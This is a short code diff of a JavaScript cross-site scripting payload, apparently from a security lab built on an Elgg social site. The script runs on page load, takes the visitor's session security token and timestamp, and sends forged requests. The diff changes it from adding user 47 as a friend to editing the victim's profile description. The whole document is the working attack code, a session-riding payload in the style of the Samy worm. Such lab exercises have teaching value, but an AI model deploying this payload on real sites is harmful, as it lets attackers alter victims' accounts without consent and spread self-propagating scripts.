@@ -5,7 +5,7 @@ window.onload = function () {
     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
     var briefDesc = "&briefdescription=1605011"+"&accesslevel[briefdescription]=2";
     
-    var sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;
+    var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
     var content = name + guid + ts + token + briefDesc;
     
     var samyGuid = 47;
@@ -16,6 +16,6 @@ window.onload = function () {
         Ajax.open("POST", sendurl, true);
         Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
         Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-        Ajax.send();
+        Ajax.send(content);
     }
 }
